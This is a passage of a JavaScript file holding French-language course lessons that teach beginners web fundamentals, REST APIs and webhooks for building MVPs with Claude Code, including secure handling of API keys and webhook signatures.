// Phase 3 : Compétences Techniques + MVP — Modules 4-5 (14 leçons)

export const LESSONS = [
  // ═══════════════════════════════════════════════════
  // MODULE 6 : Compétences Techniques Essentielles (7 leçons)
  // ═══════════════════════════════════════════════════
  {
    order: 32,
    module: 4,
    title: "HTML, CSS, JavaScript : les fondamentaux du web",
    slug: "html-css-javascript-fondamentaux-web",
    duration: "55 min",
    description: "Comprendre les bases du web pour mieux travailler avec Claude Code.",
    content: `<h2>Pourquoi apprendre les bases du web</h2>
<p>Tu n'as pas besoin de devenir développeur. Mais pour construire un MVP avec Claude Code, tu dois comprendre les trois piliers du web : HTML, CSS et JavaScript. Quand Claude génère du code, tu dois être capable de lire ce qu'il produit, repérer les erreurs évidentes et demander des corrections précises. Sans cette compréhension minimale, tu es comme un chef de chantier qui ne sait pas lire un plan : tu dépends entièrement de l'exécutant, sans pouvoir valider ni orienter son travail.</p>
<p>Pense à ça comme apprendre à lire un plan d'architecte. Tu ne construis pas la maison toi-même, mais tu dois comprendre le plan pour valider le travail et communiquer avec l'architecte. Un freelance qui utilise Claude Code sans comprendre HTML/CSS/JS va perdre des heures à décrire des problèmes qu'il ne sait pas nommer. À l'inverse, celui qui connaît les bases peut dire : "Le padding du bouton est trop grand, réduis-le à px-3 py-1" — et Claude corrige en une seconde.</p>
<p><strong>Astuce :</strong> Tu n'as pas besoin de tout mémoriser. L'objectif est de reconnaître les concepts quand tu les vois dans le code généré par Claude. Avec le temps, tu retiendras naturellement les éléments que tu croises le plus souvent.</p>
<p><strong>Conseil pro :</strong> Garde un document de notes où tu inscris les balises HTML, propriétés CSS et fonctions JavaScript que tu rencontres régulièrement. En quelques semaines, tu auras ton propre aide-mémoire personnalisé qui te fera gagner un temps fou.</p>

<h2>HTML : la structure de la page</h2>
<p>HTML (HyperText Markup Language) définit la structure d'une page web. C'est le squelette. Chaque élément est entouré de balises. Imagine que tu construis une maison : HTML, c'est les murs, les pièces, les portes et les fenêtres. Sans HTML, il n'y a tout simplement rien à afficher dans le navigateur.</p>
<p>Voici les balises que tu verras le plus souvent dans le code généré par Claude :</p>
<ul>
<li><code>&lt;h1&gt;</code> à <code>&lt;h6&gt;</code> : Les titres, du plus grand au plus petit. Un bon site n'a qu'un seul <code>&lt;h1&gt;</code> par page (important pour le SEO).</li>
<li><code>&lt;p&gt;</code> : Un paragraphe de texte. C'est la balise la plus courante pour le contenu textuel.</li>
<li><code>&lt;a href="..."&gt;</code> : Un lien cliquable. L'attribut <code>href</code> contient l'URL de destination. Exemple concret : le bouton "Voir nos tarifs" de ta landing page sera probablement un lien.</li>
<li><code>&lt;img src="..."&gt;</code> : Une image. L'attribut <code>src</code> pointe vers le fichier image. N'oublie jamais l'attribut <code>alt</code> pour l'accessibilité.</li>
<li><code>&lt;div&gt;</code> : Un conteneur générique pour grouper des éléments. Claude en utilise beaucoup pour organiser la mise en page.</li>
<li><code>&lt;button&gt;</code> : Un bouton interactif. Utilisé pour les actions : soumettre un formulaire, ouvrir un modal, déclencher une fonction.</li>
<li><code>&lt;form&gt;</code> : Un formulaire avec des champs de saisie. Indispensable pour les inscriptions, les contacts, la création de contenu.</li>
<li><code>&lt;ul&gt;</code> et <code>&lt;li&gt;</code> : Une liste à puces. Parfait pour les listes de fonctionnalités, les menus de navigation, les éléments de sidebar.</li>
<li><code>&lt;input&gt;</code> : Un champ de saisie dans un formulaire. Il peut être de type texte, email, password, number, etc.</li>
<li><code>&lt;header&gt;</code>, <code>&lt;main&gt;</code>, <code>&lt;footer&gt;</code> : Les balises sémantiques qui structurent la page en sections logiques. Le header contient la navigation, le main contient le contenu principal, le footer contient les liens secondaires.</li>
</ul>
<p>Un document HTML a toujours la même structure de base : un <code>&lt;head&gt;</code> (métadonnées, titre de la page, liens CSS) et un <code>&lt;body&gt;</code> (le contenu visible). Quand Claude Code génère une page, tu retrouveras toujours cette structure. Le <code>&lt;head&gt;</code> est invisible pour l'utilisateur mais crucial pour le navigateur et le référencement.</p>
<p><strong>Attention :</strong> Ne confonds pas <code>&lt;head&gt;</code> (les métadonnées de la page) et <code>&lt;header&gt;</code> (la barre de navigation visible). C'est une confusion fréquente chez les débutants.</p>

<h3>Les attributs HTML importants</h3>
<p>Les balises peuvent avoir des attributs qui ajoutent des informations :</p>
<ul>
<li><code>class="nom"</code> : Permet de cibler l'élément en CSS pour le styliser. Avec Tailwind, c'est ici que tu mets les classes de style.</li>
<li><code>id="unique"</code> : Un identifiant unique pour l'élément. Utile pour le JavaScript et les ancres de navigation.</li>
<li><code>src="chemin"</code> : La source d'une image où d'un script.</li>
<li><code>href="url"</code> : La destination d'un lien.</li>
<li><code>placeholder="texte"</code> : Le texte d'indication dans un champ de formulaire. Exemple : "Entrez votre email..."</li>
</ul>

<h2>CSS : le style visuel</h2>
<p>CSS (Cascading Style Sheets) contrôle l'apparence de la page. C'est la peinture, la décoration et l'agencement. Sans CSS, une page HTML est une simple liste de texte brut sur fond blanc — techniquement fonctionnelle, mais visuellement catastrophique. Personne ne restera sur un site qui ressemble à un document Word des années 90.</p>
<p>Pour reprendre notre analogie de la maison : si HTML est la structure (murs, pièces, portes), CSS est la décoration intérieure (couleurs, meubles, éclairage, agencement). C'est ce qui transforme un espace vide en un lieu accueillant.</p>
<p>Les propriétés CSS les plus courantes que tu verras dans le code de Claude :</p>
<ul>
<li><code>color</code> et <code>background-color</code> : Les couleurs du texte et de l'arrière-plan. Exemple : <code>color: #333;</code> pour un texte gris foncé lisible.</li>
<li><code>font-size</code>, <code>font-weight</code> : La taille et l'épaisseur du texte. Un titre sera en <code>font-weight: bold;</code> et en grande taille.</li>
<li><code>margin</code> et <code>padding</code> : L'espacement extérieur et intérieur. Le margin crée de l'espace autour de l'élément, le padding crée de l'espace à l'intérieur. Imagine margin comme la distance entre deux meubles, et padding comme le coussin à l'intérieur d'un canapé.</li>
<li><code>display: flex</code> : Le système de mise en page flexible (Flexbox). C'est LA propriété la plus utilisée pour aligner des éléments côte à côte où les centrer.</li>
<li><code>border-radius</code> : Les coins arrondis. Très populaire pour les boutons et les cartes modernes.</li>
<li><code>box-shadow</code> : Les ombres portées. Donne de la profondeur et du relief aux éléments.</li>
</ul>
<p><strong>Astuce :</strong> Quand Claude génère du CSS que tu ne comprends pas, copie la propriété dans Google avec "CSS" devant. Par exemple, "CSS display grid" te donnera des explications visuelles très claires.</p>

<h3>Tailwind CSS : le framework que Claude adore</h3>
<p>Dans la plupart des projets, Claude Code utilise Tailwind CSS plutôt que du CSS classique. Au lieu d'écrire des fichiers CSS séparés, tu mets les styles directement dans les classes HTML. C'est une approche appelée "utility-first" qui peut sembler bizarre au début mais qui est redoutablement efficace une fois qu'on s'y habitue.</p>
<p><code>&lt;button class="bg-blue-500 text-white px-4 py-2 rounded-lg hover:bg-blue-600"&gt;</code></p>
<p>Ça veut dire : fond bleu, texte blanc, padding horizontal de 4, padding vertical de 2, coins arrondis, et le fond devient plus foncé au survol. Une fois que tu comprends la logique, c'est très lisible. C'est comme un langage abrégé : <code>bg</code> = background, <code>px</code> = padding horizontal, <code>py</code> = padding vertical, <code>rounded</code> = coins arrondis.</p>
<p><strong>Conseil pro :</strong> Le site tailwindcss.com/docs est ta bible. Utilise la barre de recherche pour trouver n'importe quelle classe en quelques secondes. Par exemple, cherche "shadow" pour voir toutes les variantes d'ombres disponibles.</p>
<p><strong>Attention :</strong> Tailwind génère des classes très longues dans le HTML. Ne t'inquiète pas si une balise a 15 classes — c'est normal et attendu. L'avantage est que tu vois immédiatement tous les styles appliqués à un élément sans naviguer dans un fichier CSS séparé.</p>

<h2>JavaScript : l'interactivité</h2>
<p>JavaScript (JS) rend la page vivante. C'est le cerveau. Sans lui, une page web est statique — elle affiche du contenu mais ne réagit pas aux actions de l'utilisateur. Pas de formulaire qui se valide, pas de menu qui s'ouvre, pas de notification qui apparaît, pas de données qui se chargent dynamiquement.</p>
<p>Pour continuer notre analogie : si HTML est la structure de la maison et CSS la décoration, JavaScript est l'électricité, la plomberie et la domotique. C'est ce qui fait que les interrupteurs fonctionnent, que l'eau coule quand tu ouvres le robinet, et que la lumière s'allume automatiquement quand tu entres dans une pièce.</p>
<p>Les concepts JavaScript essentiels que tu dois reconnaître :</p>
<ul>
<li><strong>Variables</strong> : <code>const nom = "Opexia";</code> — stocker des valeurs. <code>const</code> pour les valeurs qui ne changent pas, <code>let</code> pour celles qui changent. Exemple concret : <code>const prix = 29.99;</code> stocke le prix d'un abonnement.</li>
<li><strong>Fonctions</strong> : <code>function calculer(a, b) { return a + b; }</code> — des blocs de code réutilisables. Tu verras aussi la syntaxe fléchée : <code>const calculer = (a, b) => a + b;</code> qui est plus moderne et plus courante dans le code de Claude.</li>
<li><strong>Conditions</strong> : <code>if (age >= 18) { ... }</code> — exécuter du code selon une condition. Indispensable pour la logique métier : "si l'utilisateur est connecté, affiche le dashboard, sinon affiche la page de connexion".</li>
<li><strong>Événements</strong> : <code>button.addEventListener("click", maFonction)</code> — réagir aux actions utilisateur. En React, c'est simplifié en <code>onClick={maFonction}</code>.</li>
<li><strong>Tableaux</strong> : <code>const fruits = ["pomme", "banane", "orange"];</code> — des listes de valeurs. Tu verras souvent <code>.map()</code> pour transformer un tableau et <code>.filter()</code> pour le filtrer.</li>
<li><strong>Objets</strong> : <code>const user = { nom: "Alice", age: 25 };</code> — des structures de données. La base de toute donnée manipulée dans ton application.</li>
<li><strong>Async/Await</strong> : <code>const data = await fetch("/api/users");</code> — gérer les opérations asynchrones (appels API, lecture de base de données). Tu verras beaucoup de <code>async/await</code> dans le code backend généré par Claude.</li>
</ul>
<p><strong>Astuce :</strong> Quand tu lis du code JavaScript généré par Claude, concentre-toi d'abord sur les noms de variables et de fonctions. Un bon code se lit presque comme de l'anglais : <code>const activeUsers = users.filter(user => user.isActive)</code> — "les utilisateurs actifs = les utilisateurs filtrés par ceux qui sont actifs".</p>

<h3>TypeScript : JavaScript avec des filets de sécurité</h3>
<p>Claude Code génère souvent du TypeScript plutôt que du JavaScript. TypeScript ajoute un système de types qui attrape les erreurs avant l'exécution. Par exemple, si tu déclares qu'une variable est un nombre, TypeScript t'empêche d'y mettre du texte par accident. C'est comme un correcteur orthographique pour le code — il souligne les erreurs en rouge avant même que tu lances l'application.</p>
<p>En pratique, tu verras des annotations de types comme <code>: string</code>, <code>: number</code>, <code>: boolean</code> après les noms de variables. Par exemple : <code>function saluer(nom: string): string { return "Bonjour " + nom; }</code>. Ne t'inquiète pas si ça te semble verbeux — c'est ce qui rend le code plus fiable et plus facile à maintenir sur le long terme.</p>
<p><strong>Conseil pro :</strong> Si tu vois des erreurs TypeScript en rouge dans ton éditeur, ne les ignore pas. Dis à Claude : "Il y à une erreur TypeScript sur la ligne X, corrige-la." Ces erreurs, si elles sont ignorées, deviennent souvent des bugs en production.</p>

<h2>React et Next.js : ce que Claude utilise pour construire</h2>
<p>Dans les projets modernes, Claude Code utilise React (une librairie JavaScript créée par Facebook) et Next.js (un framework basé sur React). React découpe l'interface en composants réutilisables — un bouton, une carte, un menu de navigation — que tu peux assembler comme des Lego. Au lieu de créer une page monolithique de 1000 lignes, tu crées des petits composants de 20-50 lignes que tu combines.</p>
<p>Imagine que tu construis une page de dashboard. Au lieu d'une seule page géante, tu as : un composant <code>Header</code> (la barre de navigation), un composant <code>Sidebar</code> (le menu latéral), un composant <code>StatsCard</code> (une carte avec un chiffre clé), un composant <code>DataTable</code> (un tableau de données). Chaque composant est indépendant, testable et réutilisable sur d'autres pages.</p>
<p>Next.js ajoute des fonctionnalités essentielles par-dessus React : le routage (chaque fichier dans le dossier <code>app/</code> devient une page — pas besoin de configurer les routes manuellement), le rendu serveur (les pages se chargent plus vite et sont mieux référencées sur Google), et les routes API (tu peux créer ton backend dans le même projet, sans serveur séparé).</p>
<p><strong>Astuce :</strong> Quand tu vois un fichier <code>.tsx</code> dans ton projet, c'est un composant React écrit en TypeScript. Quand tu vois <code>page.tsx</code> dans un dossier de <code>app/</code>, c'est une page de ton site. Quand tu vois <code>route.ts</code> dans <code>app/api/</code>, c'est un endpoint d'API backend.</p>
<p><strong>Attention :</strong> Ne te laisse pas submerger par tous ces termes. Tu n'as pas besoin de maîtriser React où Next.js en profondeur. L'objectif est de reconnaître ces concepts quand Claude les utilise et de pouvoir lui poser les bonnes questions. C'est comme conduire une voiture : tu n'as pas besoin de comprendre le moteur à combustion interne pour aller du point A au point B.</p>

<blockquote>Tu n'as pas besoin de maîtriser tout ça. L'objectif est de reconnaître ces concepts quand Claude les utilise et de pouvoir lui poser les bonnes questions. La compréhension viendra naturellement avec la pratique.</blockquote>`,
    exercise: `<h3>Exercice pratique</h3>
<ol>
<li>Ouvre les DevTools de ton navigateur (F12 où Ctrl+Shift+I) sur n'importe quel site web. Explore l'onglet "Éléments" et identifie les balises HTML principales : <code>&lt;header&gt;</code>, <code>&lt;nav&gt;</code>, <code>&lt;main&gt;</code>, <code>&lt;footer&gt;</code>.</li>
<li>Dans l'onglet "Éléments", clique sur un élément et modifie ses styles CSS en temps réel (change une couleur, un padding, une font-size). Observe l'effet immédiat.</li>
<li>Demande à Claude : "Génère-moi une page HTML simple avec un titre, un paragraphe, un bouton et du CSS Tailwind pour que ça soit joli." Lis le code généré et identifie chaque balise.</li>
<li>Modifie le code généré par Claude en changeant les couleurs Tailwind (par exemple <code>bg-blue-500</code> en <code>bg-green-500</code>) et observe le résultat.</li>
<li>Ouvre la console JavaScript (onglet "Console" des DevTools) et tape <code>document.querySelectorAll("a").length</code> pour compter tous les liens de la page.</li>
</ol>`,
  },
  {
    order: 33,
    module: 4,
    title: "Les APIs REST : communiquer avec des services externes",
    slug: "apis-rest-communiquer-services-externes",
    duration: "50 min",
    description: "Comprendre les APIs pour connecter ton MVP à des services tiers.",
    content: `<h2>Qu'est-ce qu'une API ?</h2>
<p>Une API (Application Programming Interface) est un intermédiaire qui permet à deux logiciels de communiquer entre eux. Quand tu utilises une app météo sur ton téléphone, cette app envoie une requête à une API qui lui renvoie les données météo. L'app ne calcule pas la météo elle-même — elle demande l'information à un serveur spécialisé. C'est un principe fondamental du web moderne : chaque service fait ce qu'il sait faire de mieux, et les APIs permettent de les connecter entre eux.</p>
<p>Pour ton MVP, les APIs sont essentielles. Tu vas les utiliser pour envoyer des emails (SendGrid, Resend), traiter des paiements (Stripe), stocker des fichiers (Cloudinary, AWS S3), envoyer des SMS (Twilio), et bien plus encore. Plutôt que de tout coder toi-même (ce qui prendrait des mois), tu te branches sur des services existants qui ont déjà résolu ces problèmes complexes.</p>
<p>Pense aux APIs comme au service de livraison d'un restaurant. Tu ne cuisines pas toi-même — tu passes commande (la requête), le restaurant prépare ton plat (le traitement), et le livreur t'apporte le résultat (la réponse). L'API, c'est le système de commande qui connecte toi (le client) au restaurant (le service).</p>
<p><strong>Exemple concret :</strong> Un freelance qui crée un MVP de facturation va utiliser l'API de Stripe pour gérer les paiements, l'API de Resend pour envoyer les factures par email, et l'API de Cloudinary pour stocker les logos des clients. Sans ces APIs, il devrait coder un système de paiement (des mois de travail), un serveur email (encore des mois) et un système de stockage de fichiers. Grâce aux APIs, tout ça se fait en quelques heures avec Claude Code.</p>

<h2>REST : le standard du web</h2>
<p>REST (Representational State Transfer) est le style d'API le plus répandu sur le web. Une API REST utilise les mêmes protocoles que ton navigateur : HTTP. Chaque ressource (un utilisateur, un produit, une commande) à une URL unique, et tu interagis avec elle en utilisant des méthodes HTTP. C'est comme un système d'adressage universel : chaque donnée a son adresse, et tu sais exactement comment la lire, la modifier où la supprimer.</p>
<p>L'analogie parfaite : imagine une bibliothèque. Chaque livre (ressource) à une cote unique (URL). Tu peux consulter un livre (GET), en ajouter un nouveau (POST), remplacer un livre endommagé (PUT), corriger une erreur sur la couverture (PATCH) où retirer un livre du catalogue (DELETE). REST, c'est le système de gestion de cette bibliothèque.</p>

<h3>Les méthodes HTTP</h3>
<ul>
<li><strong>GET</strong> : Récupérer des données. Exemple : <code>GET /api/users</code> — lister tous les utilisateurs. C'est la méthode la plus courante, celle que ton navigateur utilise chaque fois que tu visites une page web.</li>
<li><strong>POST</strong> : Créer une nouvelle ressource. Exemple : <code>POST /api/users</code> avec les données du nouvel utilisateur dans le corps de la requête. Utilisé quand un utilisateur s'inscrit, crée un projet où soumet un formulaire.</li>
<li><strong>PUT</strong> : Mettre à jour une ressource existante en entier. Exemple : <code>PUT /api/users/42</code>. Tu remplaces toutes les données de l'utilisateur 42.</li>
<li><strong>PATCH</strong> : Mettre à jour partiellement une ressource. Exemple : changer juste l'email d'un utilisateur sans toucher au reste. Plus précis et plus léger que PUT.</li>
<li><strong>DELETE</strong> : Supprimer une ressource. Exemple : <code>DELETE /api/users/42</code>. Attention, c'est irréversible dans la plupart des cas !</li>
</ul>
<p><strong>Astuce :</strong> Retiens cette règle simple : GET = lire, POST = créer, PUT/PATCH = modifier, DELETE = supprimer. C'est le fameux CRUD (Create, Read, Update, Delete) que tu retrouveras dans tous les projets web.</p>

<h2>JSON : le langage des APIs</h2>
<p>Les APIs communiquent en JSON (JavaScript Object Notation). C'est un format de données simple et lisible par les humains et les machines. Voici à quoi ressemble une réponse JSON typique :</p>
<p><code>{ "id": 42, "name": "Alice Martin", "email": "alice@example.com", "plan": "pro" }</code></p>
<p>JSON utilise des paires clé-valeur, des tableaux et des objets imbriqués. C'est le même format que les objets JavaScript, ce qui rend l'intégration naturelle dans les applications web. Tu peux imbriquer des structures complexes : un utilisateur qui à des projets, chaque projet ayant des tâches, chaque tâche ayant des commentaires — tout ça se représente élégamment en JSON.</p>
<p><strong>Conseil pro :</strong> Installe l'extension de navigateur "JSON Formatter" où "JSON Viewer". Quand tu appelles une API directement dans ton navigateur, l'extension formate le JSON de manière lisible avec de l'indentation et de la coloration syntaxique. Sans elle, tu verras un bloc de texte compact et illisible.</p>

<h3>Les codes de statut HTTP</h3>
<p>Quand une API répond, elle inclut un code de statut qui indique si la requête a réussi. Ces codes sont universels — tu les retrouveras sur toutes les APIs du monde :</p>
<ul>
<li><strong>200 OK</strong> : Tout s'est bien passé. La réponse contient les données demandées.</li>
<li><strong>201 Created</strong> : La ressource a été créée avec succès. Tu recevras souvent les données de la ressource créée en retour.</li>
<li><strong>400 Bad Request</strong> : Ta requête contient une erreur (champ manquant, format invalide). C'est TOI qui as fait une erreur — vérifie les données que tu envoies.</li>
<li><strong>401 Unauthorized</strong> : Tu n'es pas authentifié (clé API manquante où invalide). Vérifie que ta clé est correcte et bien envoyée dans les headers.</li>
<li><strong>403 Forbidden</strong> : Tu es authentifié mais tu n'as pas les droits pour cette action. Ton plan gratuit n'a peut-être pas accès à cet endpoint.</li>
<li><strong>404 Not Found</strong> : La ressource n'existe pas. Vérifie l'URL — une faute de frappe est souvent la cause.</li>
<li><strong>429 Too Many Requests</strong> : Tu as envoyé trop de requêtes en peu de temps. Attends un peu et réessaie. La plupart des APIs limitent le nombre de requêtes par minute.</li>
<li><strong>500 Internal Server Error</strong> : Le serveur a planté — ce n'est pas ta faute. L'erreur est du côté du service. Réessaie plus tard.</li>
</ul>
<p><strong>Astuce :</strong> Les codes commençant par 2xx = succès, 4xx = erreur de ta part, 5xx = erreur du serveur. Retiens juste ces trois familles et tu sauras rapidement où chercher le problème.</p>

<h2>L'authentification des APIs</h2>
<p>La plupart des APIs exigent une authentification pour contrôler qui y accède. C'est comme la serrure de ta maison : tu ne laisses pas n'importe qui entrer. Les méthodes les plus courantes :</p>
<ul>
<li><strong>API Key</strong> : Une clé unique que tu passes dans les en-têtes de la requête. Simple et courant pour les services tiers comme Stripe, Resend où OpenAI. C'est comme un badge d'accès : tu le montres à chaque requête pour prouver que tu es autorisé.</li>
<li><strong>Bearer Token</strong> : Un token JWT (JSON Web Token) que tu obtiens après une connexion. Courant pour les APIs de tes propres applications. Le token contient des informations sur l'utilisateur (id, rôle) et à une durée de validité limitée.</li>
<li><strong>OAuth 2.0</strong> : Un flux d'autorisation où l'utilisateur se connecte via un service tiers (Google, GitHub). Plus complexe mais plus sécurisé. C'est ce qu'on utilise quand on clique "Se connecter avec Google".</li>
</ul>
<p>En pratique, tu stockeras tes clés API dans des variables d'environnement (<code>.env</code>) et jamais directement dans le code. Claude Code sait faire ça correctement. C'est une règle de sécurité fondamentale : si tu publies ton code sur GitHub avec une clé API en dur, n'importe qui peut l'utiliser à tes frais.</p>
<p><strong>Attention :</strong> Chaque clé API à des permissions différentes. Stripe, par exemple, à une clé publique (pour le frontend, limitée) et une clé secrète (pour le backend, accès total). Ne mets JAMAIS la clé secrète dans le code frontend — elle serait visible par n'importe qui dans les DevTools du navigateur.</p>

<h2>Appeler une API en pratique</h2>
<p>En JavaScript/TypeScript, tu utilises la fonction <code>fetch</code> pour appeler une API. C'est la fonction native du navigateur et de Node.js pour faire des requêtes HTTP :</p>
<p><code>const response = await fetch("https://api.example.com/users", { method: "GET", headers: { "Authorization": "Bearer ton-token" } });</code></p>
<p>Pour envoyer des données avec POST, tu ajoutes un corps à la requête :</p>
<p><code>const response = await fetch("https://api.example.com/users", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ name: "Alice", email: "alice@example.com" }) });</code></p>
<p>Le <code>Content-Type: application/json</code> dit au serveur que tu envoies du JSON. Le <code>JSON.stringify</code> convertit un objet JavaScript en chaîne JSON. Ces deux éléments sont indispensables pour les requêtes POST — si tu les oublies, l'API ne comprendra pas ta requête.</p>
<p><strong>Conseil pro :</strong> Quand tu débugues un appel API, vérifie d'abord le code de statut de la réponse, puis le corps de la réponse. La plupart des APIs renvoient un message d'erreur explicatif en JSON quand quelque chose ne va pas. Par exemple : <code>{ "error": "Invalid email format" }</code>.</p>

<h2>Les APIs que tu vas utiliser dans ton MVP</h2>
<p>Voici les services les plus courants et les plus utiles pour un MVP. Claude Code sait intégrer chacun d'entre eux :</p>
<ul>
<li><strong>Stripe</strong> : Paiements en ligne — la référence pour les startups et les SaaS. Accepte les cartes bancaires, gère les abonnements, les factures et les remboursements. Documentation excellente.</li>
<li><strong>Resend / SendGrid</strong> : Envoi d'emails transactionnels (confirmation d'inscription, notification de paiement, rappels). Resend est plus moderne et plus simple, SendGrid est plus établi.</li>
<li><strong>Cloudinary</strong> : Upload et transformation d'images. Redimensionnement automatique, optimisation, CDN. Parfait si ton MVP gère des photos de profil où des images de produits.</li>
<li><strong>OpenAI / Anthropic API</strong> : Intégrer l'IA dans ton produit. Génération de texte, analyse, classification. Si ton MVP à une fonctionnalité IA, c'est par là que ça passe.</li>
<li><strong>Vercel Analytics</strong> : Suivre les performances et l'usage de ton application. Gratuit et intégré à Vercel.</li>
<li><strong>Twilio</strong> : Envoi de SMS et appels téléphoniques. Utile pour la vérification par SMS où les notifications urgentes.</li>
</ul>
<p><strong>Astuce :</strong> Commence toujours par lire la section "Quickstart" où "Getting Started" de la documentation d'une API. En 10 minutes, tu comprends le principe et tu peux demander à Claude de l'intégrer dans ton projet.</p>

<blockquote>Les APIs sont les Lego du web moderne. Au lieu de tout construire toi-même, tu assembles des services spécialisés pour créer ton produit. C'est ce qui permet à un solo-preneur de rivaliser avec des équipes de 50 développeurs.</blockquote>`,
    exercise: `<h3>Exercice pratique</h3>
<ol>
<li>Ouvre ton navigateur et va sur <code>https://jsonplaceholder.typicode.com/users</code>. C'est une API gratuite de test. Observe la structure JSON de la réponse.</li>
<li>Ouvre la console de ton navigateur (F12 > Console) et exécute : <code>fetch("https://jsonplaceholder.typicode.com/posts/1").then(r => r.json()).then(data => console.log(data))</code>. Observe les données retournées.</li>
<li>Demande à Claude : "Écris-moi une fonction TypeScript qui appelle l'API JSONPlaceholder pour récupérer la liste des posts et les afficher." Lis le code et identifie les méthodes HTTP, les en-têtes et le parsing JSON.</li>
<li>Explore la documentation de l'API Stripe (stripe.com/docs/api). Identifie les endpoints pour créer un client, créer un paiement et lister les transactions.</li>
<li>Crée un fichier <code>.env.example</code> et liste les clés API dont tu aurais besoin pour un MVP : STRIPE_API_KEY, RESEND_API_KEY, DATABASE_URL.</li>
</ol>`,
  },
  {
    order: 34,
    module: 4,
    title: "Webhooks et automatisations en temps réel",
    slug: "webhooks-automatisations-temps-réel",
    duration: "50 min",
    description: "Connecter des services entre eux avec des webhooks et des outils no-code.",
    content: `<h2>Le problème du polling</h2>
<p>Imagine que tu attends un colis. Tu as deux options : appeler le livreur toutes les 5 minutes pour demander "il est où mon colis ?" (polling), où lui donner ton adresse et attendre qu'il vienne sonner à ta porte (webhook). La première option gaspille du temps et de l'énergie. La seconde est intelligente et efficace.</p>
<p>C'est exactement la différence entre le polling et les webhooks dans le monde des APIs. Avec le polling, ton application interroge régulièrement un service pour vérifier s'il y a du nouveau. C'est comme rafraîchir ta boîte mail toutes les 30 secondes — ça consomme des ressources, ça ralentit ton app, et 99% du temps, il n'y a rien de nouveau.</p>
<p>Avec les webhooks, le service t'envoie automatiquement les données dès qu'un événement se produit. C'est instantané, efficace et élégant. Pas de gaspillage de ressources, pas de délai — l'information arrive au moment exact où elle est disponible.</p>
<p><strong>Exemple concret :</strong> Un consultant qui à un SaaS avec paiement Stripe. Sans webhook, il devrait vérifier toutes les minutes si un paiement est arrivé. Avec un webhook Stripe, dès qu'un client paye, l'information arrive dans son app en moins d'une seconde, l'accès est activé immédiatement, et l'email de confirmation part automatiquement. L'utilisateur à une expérience fluide, et le consultant n'a rien à faire manuellement.</p>

<h2>Comment fonctionne un webhook</h2>
<p>Un webhook est une URL de ton application que tu enregistres auprès d'un service externe. Quand un événement spécifique se produit (un paiement reçu, un formulaire soumis, un email ouvert), le service envoie automatiquement une requête HTTP POST à ton URL avec les données de l'événement. C'est comme si tu donnais ton numéro de téléphone à quelqu'un en disant : "Appelle-moi quand c'est prêt."</p>
<p>Le flux est simple :</p>
<ol>
<li>Tu crées une route API dans ton application (exemple : <code>/api/webhooks/stripe</code>)</li>
<li>Tu donnes cette URL à Stripe dans ton tableau de bord</li>
<li>Quand un client paye, Stripe envoie un POST à ton URL avec les détails du paiement (montant, client, statut, date)</li>
<li>Ton application traite les données (met à jour la base de données, envoie un email de confirmation, active l'abonnement)</li>
</ol>
<p>Le tout se passe en quelques millisecondes. L'utilisateur voit son accès activé quasi instantanément après le paiement.</p>
<p><strong>Astuce :</strong> Pense aux webhooks comme des "notifications push" entre serveurs. De la même manière que ton téléphone reçoit une notification quand tu as un nouveau message, ton serveur reçoit une notification (webhook) quand un événement se produit sur un service externe.</p>

<h3>La sécurité des webhooks</h3>
<p>N'importe qui pourrait envoyer une requête à ton URL de webhook en prétendant être Stripe. Un pirate pourrait simuler un paiement réussi pour obtenir un accès gratuit. C'est pourquoi les services sérieux signent leurs webhooks.</p>
<p>Stripe, par exemple, inclut une signature dans les en-têtes de la requête. Ton application vérifie cette signature avec un secret partagé pour s'assurer que la requête vient bien de Stripe et n'a pas été modifiée en transit. C'est comme vérifier le cachet officiel sur un courrier recommandé — seul l'expéditeur légitime peut le produire.</p>
<p>Claude Code sait implémenter cette vérification. Il te suffit de lui dire : "Ajoute la vérification de signature Stripe sur mon webhook." Il ajoutera le code nécessaire avec la librairie officielle Stripe.</p>
<p><strong>Attention :</strong> Ne saute JAMAIS l'étape de vérification de signature, même pour un MVP. C'est une faille de sécurité critique. Sans elle, n'importe qui peut simuler un webhook et manipuler tes données.</p>

<h2>Les événements courants</h2>
<p>Voici les types d'événements webhook que tu rencontreras dans ton MVP. Chaque service a sa propre liste d'événements, documentée dans sa documentation officielle :</p>
<ul>
<li><strong>Stripe</strong> : <code>payment_intent.succeeded</code> (paiement réussi), <code>customer.subscription.created</code> (nouvel abonnement), <code>invoice.paid</code> (facture payée), <code>customer.subscription.deleted</code> (désabonnement). Ce sont les événements les plus importants pour un SaaS.</li>
<li><strong>GitHub</strong> : <code>push</code> (nouveau code poussé), <code>pull_request.opened</code> (PR ouverte), <code>issues.created</code> (nouveau ticket). Utile pour les outils de développement où les intégrations CI/CD.</li>
<li><strong>Resend</strong> : <code>email.delivered</code> (email délivré), <code>email.bounced</code> (email rejeté), <code>email.opened</code> (email ouvert). Crucial pour suivre la délivrabilité de tes emails transactionnels.</li>
<li><strong>Formulaires</strong> : <code>form.submitted</code> — quand un utilisateur remplit un formulaire. Permet de déclencher des actions automatiques (envoi d'email de bienvenue, ajout au CRM).</li>
</ul>
<p><strong>Conseil pro :</strong> Quand tu intègres un nouveau service, commence par configurer les webhooks pour les événements critiques (paiement, inscription). Les autres événements (ouverture d'email, etc.) peuvent être ajoutés plus tard. Ne surcharge pas ton MVP avec 20 webhooks dès le début.</p>

<h2>Architecture event-driven</h2>
<p>Les webhooks sont la base d'une architecture orientée événements (event-driven). Au lieu que ton application fasse tout de manière séquentielle, elle réagit aux événements au fur et à mesure qu'ils arrivent. C'est plus scalable, plus réactif et plus découplé.</p>
<p>Un exemple concret pour comprendre la différence : quand un client paye sur ton MVP, plutôt que de tout faire dans le même code (mettre à jour la BDD + envoyer un email + générer une facture + notifier Slack — si une étape plante, tout plante), tu publies un événement "paiement reçu" et différents gestionnaires réagissent chacun à leur manière, indépendamment les uns des autres.</p>
<p>C'est comme un journal télévisé : le présentateur annonce une nouvelle (l'événement), et chaque téléspectateur (gestionnaire) réagit à sa manière — l'un prend des notes, l'autre en discute avec sa famille, un troisième change de chaîne. Le présentateur n'a pas besoin de savoir ce que fait chaque téléspectateur.</p>
<p><strong>Astuce :</strong> Pour un MVP, n'over-engineer pas l'architecture event-driven. Commence simple : un webhook Stripe qui met à jour la BDD et envoie un email, tout dans la même fonction. Tu découpleras plus tard quand tu auras des problèmes de performance où de fiabilité.</p>

<h2>Les outils d'automatisation no-code</h2>
